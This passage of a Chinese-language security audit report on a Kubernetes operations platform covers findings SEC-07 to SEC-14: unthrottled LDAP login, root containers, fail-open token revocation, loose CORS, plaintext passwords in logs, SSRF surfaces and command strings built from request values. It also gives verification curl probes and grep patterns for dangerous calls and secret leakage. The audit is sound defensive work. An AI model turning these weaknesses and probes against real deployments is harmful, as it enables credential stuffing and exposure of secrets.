  → 流式返回该 Pod 的 stdout（可能含 token/连接串/PII）
根本原因：内部端口按「集群内可信」设计，未考虑本地与多租户。
可能影响：日志泄露（无审计）；`/files` 虽防穿越，但仍可下载 JVM heapdump/jfr（含内存中的密钥）。
修改建议：
  1) 加 `X-Internal-Token`（与 api-server 对齐，独立密钥）；
  2) 默认监听 127.0.0.1，容器内改 0.0.0.0 并靠 NP；
  3) `/files` 下载加审计 + 时间窗限制。
验证方法：`curl :9099/logs?...` 不带任何头，修复前返回日志流。
是否需要立即处理：是
```

```
问题编号：SEC-07
问题名称：LDAP 登录完全绕过防爆破；本地登录限流按用户名不按 IP
问题等级：P1
所属模块：认证
问题描述：
  login() 在进入失败计数逻辑**之前**就把 LDAP 分支 return 掉了：
      if auth_type == "ldap":
          return await _ldap_login(username, password)      # api/auth.py:29-31
      fail_key = f"login_fail:{username}"                    # 33 行才开始限流
  → `_ldap_login` 内无任何失败计数（auth.py:59-158），可对 LDAP 无限次撞库
    （且每次成功/失败都会触发一次 LDAP bind，可放大对 AD 的压力）。
  本地登录的限制维度只有 username（无 IP/无全局阈值），
  攻击者可对大量用户名各试 5 次（password spray），也可用不存在的用户名无限触发 Redis incr。
代码位置：
  api-server/app/api/auth.py:20-56（本地）、29-31（LDAP 短路）、59-158（_ldap_login 无计数）
涉及函数或类：login、_ldap_login、_ldap_escape
调用链：POST /api/v1/auth/login {auth_type:"ldap", username, password} 循环 → 无 429
根本原因：限流放在 local 分支之后。
可能影响：域账号被撞库（LDAP 往往是统一身份源，影响面超出本平台）。
修改建议：
  1) 把失败计数提到分支之前，key 用 `ldap`/`local` 区分；
  2) 增加按 IP 与全局阈值；
  3) LDAP 失败也计入同一计数器，并对不存在用户返回与前缀相同的耗时。
验证方法：auth_type=ldap 连续 20 次错误密码，修复前无 429。
是否需要立即处理：是
```

```
问题编号：SEC-08
问题名称：容器全部以 root 运行、基础镜像未固定 digest、无 securityContext
问题等级：P2
所属模块：镜像 / 运行时
问题描述：
  4 个 Dockerfile 均无 `USER` 指令，进程以 uid 0 运行；基础镜像使用
  `alpine:latest`、`nginx:alpine`、`node:20-alpine`（仅 python 用 `3.11-slim`），
  未 pin digest；k8s Deployment 中未见 `securityContext`
  （`runAsNonRoot`/`readOnlyRootFilesystem`/`allowPrivilegeEscalation:false`/`capabilities.drop`）。
  executor 构建期从 GitHub 下载 grpc_health_probe 未校验校验和。
代码位置：
  api-server/Dockerfile:1-16、ai-service/Dockerfile:1-14、
  k8s-executor/Dockerfile:1-25（19-22 下载校验缺失）、frontend/Dockerfile:1-14
  k8s/deployments.yaml（全文无 securityContext）
涉及函数或类：—（构建/部署）
调用链：镜像被投毒或应用 RCE → 以 root 在容器内操作 → 可写 rootfs、读取所有挂载 secret
根本原因：早期快速交付，未做容器硬化。
可能影响：单容器失陷的横向能力增强；`alpine:latest` 重建出的运行时不 reproducible。
修改建议：
  1) 加非 root 用户（`useradd -u 10001` + `USER 10001`）；
  2) 基础镜像 pin digest（`alpine:3.20@sha256:...`）；
  3) Deployment 补 securityContext + `readOnlyRootFilesystem`（executor 需要写 /tmp 时挂 emptyDir）；
  4) 下载产物校验 sha256。
验证方法：`docker run --rm <image> id` 应为非 0；`kubectl get deploy -o yaml | grep -c securityContext` > 0。
是否需要立即处理：否
```

```
问题编号：SEC-09
问题名称：Redis 不可用时 token 黑名单校验降级放行，登出/踢人失效
问题等级：P2
所属模块：认证
问题描述：
      try:
          if await redis_pool.get(f"token_blacklist:{token}"): raise 401
      except HTTPException: raise
      except Exception as e:
          logger.warning("token 黑名单校验失败（Redis 不可用，降级放行）: %s", e)
  （api/middleware/auth.py:26-35）
  → Redis 抖动/被攻击时，已登出/已吊销的 token 在过期前（默认 24h）继续可用。
  同一降级思路也出现在分布式锁（多副本重复执行，见 ARCH-03）。
代码位置：
  api-server/app/middleware/auth.py:26-35
  api-server/app/api/terminal.py:22-32（WS 路径完全不查黑名单）
涉及函数或类：get_current_user
调用链：用户登出（写黑名单）→ Redis 挂 → 旧 token 继续通过鉴权
根本原因：可用性优先于安全性，且没有「短 TTL + refresh」机制兜底。
可能影响：账号被盗后「登出止损」失效；运维在 Redis 故障窗口内无法吊销会话。
修改建议：
  1) JWT 有效期降到 2-4h + 静默续期（前端当前无续期，需配套）；
  2) Redis 不可用时对**写操作**拒绝（fail-closed），只有读放行；
  3) WS/SSE 路径补黑名单校验。
验证方法：停 Redis 后用已登出 token 调写接口，当前返回 200。
是否需要立即处理：否
```

```
问题编号：SEC-10
问题名称：ai-service CORS 为 * 且 allow_credentials=True
问题等级：P2
所属模块：ai-service
问题描述：
      app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True,
                         allow_methods=["*"], allow_headers=["*"])
  （ai-service/app/main.py:59-64）
  浏览器规范下 `*` + credentials 会被拒绝（不会真的带 cookie），但配置意图过宽；
  一旦将来改成 cookie 认证或加 `allow_origin_regex`，会立刻变成真实风险。
  同时该服务的鉴权是 `X-Internal-Token`（≡JWT 密钥）。
代码位置：ai-service/app/main.py:37-48,59-64
涉及函数或类：internal_auth_middleware、CORSMiddleware
调用链：浏览器 → ai-service:9000（若网络可达）
根本原因：模板化配置未收敛。
可能影响：低（当前无 cookie 认证）；主要是配置债。
修改建议：删除 CORS 中间件（ai-service 不应被浏览器直连），或显式白名单 + 关闭 credentials。
验证方法：`curl -H "Origin: http://evil" -I /health` 不应返回 ACAO:*。
是否需要立即处理：否
```

```
问题编号：SEC-11
问题名称：初始账号明文密码进日志；备份脚本密码进命令行
问题等级：P3
所属模块：运维
问题描述：
  1) 首次启动创建 admin/operator/viewer 时以 WARNING 级别打印明文密码：
     `logger.warning("已创建默认用户 %s，初始密码: %s（请首次登录后立即修改）", ...)`
     （api-server/app/main.py:54）。日志若进 ELK/Loki，等于把初始凭据长期留存。
  2) `MYSQL_PWD="$MYSQL_PASSWORD" mysqldump ...`（k8s/backup-cronjob.yaml:54）→ 密码出现在
     进程 argv，同一节点上 `ps aux` 可见。
代码位置：api-server/app/main.py:39-55、k8s/backup-cronjob.yaml:46-60
涉及函数或类：seed_default_users、backup CronJob
调用链：首次启动 → 日志 → 日志平台
根本原因：便利性优先。
可能影响：初始凭据长期留存于日志系统；同节点进程可读 DB 备份密码。
修改建议：
  1) 只打印「已创建，密码见 ADMIN_INITIAL_PASSWORD 或首次登录强制改密」，不打印明文；
  2) 改为写一次性文件（0600）或要求必须设置 ADMIN_INITIAL_PASSWORD；
  3) mysqldump 改用 `--defaults-extra-file`（临时文件 0600）而非环境变量命令行。
验证方法：启动日志 grep 密码应无命中。
是否需要立即处理：否
```

```
问题编号：SEC-12
问题名称：管理配置型 SSRF 面（Prometheus/ES/LDAP/AI base_url/DB host）依赖「admin 可信」
问题等级：P3
所属模块：系统设置
问题描述：
  以下地址均由 admin 在系统设置/连接管理里填写，服务端会主动发起请求：
   - Prometheus URL（services/prometheus_service.py，5s 超时）
   - ES URL（services/es_client.py:13-35，60s 进程内缓存）
   - LDAP host/port（api/auth.py:73-99）
   - AI base_url（ai-service model_adapter，来自 DB ai_model_configs）
   - DB 连接 host/port（api/db_connections.py:288 仅 admin 可建）
  另外 `GET /db-connections/{id}/test` 只 require_any_user（1613-1622），任何登录用户可
  触发一次对已存 host 的连接测试。
代码位置：
  api-server/app/services/prometheus_service.py、es_client.py:13-35
  api-server/app/api/auth.py:73-99
  api-server/app/api/db_connections.py:288,1613-1622
涉及函数或类：es_client、_ldap_login、test_connection
调用链：admin 配置内部地址 → 平台代发请求（本质是设计内的功能）
根本原因：平台天然需要访问内网中间件，SSRF 与功能难分离。
可能影响：admin 本身已是最高权限，风险有限；但 `/db-connections/{id}/test` 对普通用户开放
  可被用来做「已存目标的连通性探测」。
修改建议：
  1) `/test` 加 `check_db_permission`；
  2) 对配置的 URL 做 scheme/私网地址提示（不阻断，但记录审计）；
  3) 出方向 egress 白名单（与 SEC-01 一并做）。
验证方法：viewer 调 `/db-connections/1/test` 应 403。
是否需要立即处理：否
```

```
问题编号：SEC-13
问题名称：用户创建允许空密码；LDAP 用户 password_hash 为空串
问题等级：P3
所属模块：用户管理
问题描述：
  `password_hash=hash_password(payload.get("password", ""))`（api/users.py:40）——
  未校验非空，可创建「密码为空串」的账号（bcrypt 会正常哈希 ""，登录时用空密码即可通过）。
  LDAP 自动建号写 `password_hash=""`（api/auth.py:141-148），该账号走本地登录时
  `verify_password(anything, "")` 会因 bcrypt 抛 ValueError 被捕获返回 False（安全），
  但空串哈希值本身是脏数据。
代码位置：api-server/app/api/users.py:40、api/auth.py:141-148
涉及函数或类：create_user、_ldap_login、verify_password
调用链：admin 建号不带 password → 空密码账号
根本原因：缺参数校验。
可能影响：弱口令账号（若 admin 误操作）；无自助注册入口，实际风险低。
修改建议：创建/重置时强制密码策略（长度/复杂度），LDAP 用户 `password_hash` 存不可能值
  （如 `!`）并在 verify_password 里显式拒绝。
验证方法：`POST /users {username:"x"}` 不带 password，应 400。
是否需要立即处理：否
```

```
问题编号：SEC-14
问题名称：executor 命令字符串拼接（cordon/taint/label）依赖 Go 侧分词，建议结构化
问题等级：P3
所属模块：K8s 操作
问题描述：
  api-server 侧用 f-string 组装 kubectl 风格命令，值来自 URL/请求体：
      f"cordon {node_name}"、"f"taint node {node_name} {spec}"、
      f"describe pod {pod_name}"、"f"scale ... --replicas={replicas}"
  （resources.py:2457,2467,2484,2567,2574,2634；alerts.py:396,647）
  Go 侧 ParseCommand 按空白分词后走白名单 + client-go 结构化调用，**没有 shell 解释**，
  因此不构成命令注入；但「值与命令同串」会让含空格/`--flag` 的 node/pod 名改变语义
  （例如 pod 名含 `--all-namespaces` 之类），属于健壮性缺陷。
代码位置：api-server/app/api/resources.py:2453-2670、api/alerts.py:390-400,640-650
涉及函数或类：node_cordon/node_taint/node_labels、get_alert_describe
调用链：URL 里的 node_name → f-string → ParseCommand → client-go
根本原因：早期用「命令字符串」作为 executor 的通用接口。
可能影响：参数混淆（低）；未来若有人给 executor 加 shell 执行会立刻变成注入。
修改建议：新增结构化 RPC（node/verb/args 分离），逐步替换 f-string 拼接。
验证方法：传 pod_name 含 `--all-namespaces` 观察返回是否异常。
是否需要立即处理：否
```

---

## 十、正面结论（审计中确认做得对的部分，避免重复劳动）

1. **K8s 操作不拼 shell**：全链路 client-go 结构化调用 + 命令白名单 + 危险模式拦截（`execute.go:104-127,224-236`）。
2. **YAML 解析安全**：`yaml.safe_load` 全量使用，无 `yaml.load`。
3. **无 pickle / eval / shell=True / os.system**（grep 实测 0 命中）。
4. **webhook 验签正确**：钉钉/企微/飞书三通道均 `hmac.compare_digest`，且「未配置密钥直接拒绝」（`api/webhooks.py:62,72,78-81,171-173`）。
5. **路径穿越有明确防护**：executor `/files`、SFTP 白名单、容器内读文件字符过滤三处都做了。
6. **kubeconfig / DB 密码 / 主机私钥 AES-256-GCM 加密存储**，与 Go 侧格式互通并有 `make crypto-test`（`core/security.py:24-46`、`services/cluster_credential_service.py`）。
7. **审计哈希链**：SHA256 前序哈希 + `verify-chain` 仅 admin（`services/audit_service.py:31-33,116-140`）。
8. **CORS 用白名单而非 `*`**（api-server，`main.py:575-585`）。
9. **SQL 全参数化**，用户 SQL 执行有 admin+confirm+审批+审计四重限制（`db_connections.py:1312-1348`）。
10. **Python 依赖 `==` 锁定**（18/19 行）。

---

## 十一、无法确认事项

| 事项 | 卡点 |
|---|---|
| `.env` 实际值是否为 `change-me` | 只读原则未读取真实值；只能确认「无启动期校验」，无法确认部署是否已改 |
| 生产 CNI 是否强制 NetworkPolicy | 仓库只有 YAML，未连集群 |
| 9095/9096 是否经 SamWaf/nginx stream 对外暴露 | `k8s/services.yaml:61-72` 只留注释三选一，实际网关配置不在仓库 |
| `frontend/` 是否有 `package-lock.json` 且被提交 | 已确认：存在且已跟踪（`git ls-files`），此项结案 |
| 生产是否开启 `AGENT_TLS_ENABLED` | 默认 True（`config.py:89`），但 agent 安装参数由接入时决定 |
| 是否已配 egress 策略/防火墙 | 仓库内无 NetworkPolicy egress 段 |
| ai-service 依赖的 `JWT_SECRET_KEY` 是否与实际 api-server 同源 | 同一 `.env` 注入（`docker-compose.yml` env_file），k8s 走 `secretRef`，值不可见 |

---

## 十二、审计方法与覆盖范围

**精读**
- `api-server/app/core/security.py`（全 92 行）、`core/config.py`（1-140）
- `api-server/app/middleware/auth.py`、`middleware/permission.py`
- `api-server/app/api/auth.py`（170）、`ai_proxy.py`（47）、`users.py`（密码/创建段）、
  `external_access.py`、`mcp.py`、`terminal.py`、`webhooks.py`（验签段）、`alerts.py`（528-560）
- `api-server/app/services/registry_service.py`（1-215）、`db_approval_service.py`（执行段）、
  `audit_service.py`（1-60）、`oracle_client_service.py`（subprocess 段）
- `api-server/app/utils/pod_logs.py`（235-340）、`api/resources.py`（1207-1250、2155-2200）
- `k8s-executor/cmd/executor/main.go`（88-115）、`internal/grpc/server.go`（40-240）、
  `internal/executor/execute.go`（85-240）、`internal/logstream/server.go`（1-110）、
  `internal/script/runner.go`、`internal/agentbridge/bridge.go`（160-210）
- `ai-service/app/main.py`（108 行全文）
- `frontend/nginx.conf`、`frontend/Dockerfile`、`frontend/index.html`、`frontend/src/App.tsx`（token 段）
- 4 个 Dockerfile、`docker-compose.yml`、`k8s/{networkpolicy,ingress,services,backup-cronjob}.yaml`
- `api-server/requirements.txt`、`.env.example`（键名）、`k8s/secret.example.yaml`

**扫描式 grep（均记录结果）**
- `git ls-files | grep env` → `.env` 未跟踪
- `pickle|eval(|exec(|os.system|shell=True` → 0 命中（除 redis `eval` Lua 脚本，属正常用法）
- `yaml.load(` → 0 命中；`subprocess` → 3 处（列表参数）
- `dangerouslySetInnerHTML|new Function` → 0 命中
- `localStorage` → 前端 8 处（token + user + 主题）
- `X-Internal-Token` → 5 处（4 个写入点 + ai-service 校验）
- `logger.*password|logger.*token` → 4 处（逐个复核）
- `f"DELETE FROM {t}` / `f"SELECT ... {db}` → 数据保留与方言层（受控）
- `securityContext|runAsNonRoot|USER ` 于 Dockerfile/Deployment → 0 命中

**未读**
- `api-server/app/services/*` 全量（除上述点名文件）；`ai-service/app/services/*`（模型适配细节）；
  前端 69 个页面组件（只审计认证/token/渲染危险 API 的使用点）；
  124 个 alembic 版本。

**未执行的操作（合规说明）**：未修改任何业务文件（仅新建本报告）、未安装依赖、未连接任何环境、
未对线上发请求、未执行 git 写操作（只用 `git ls-files` / `git status` 只读查询）。
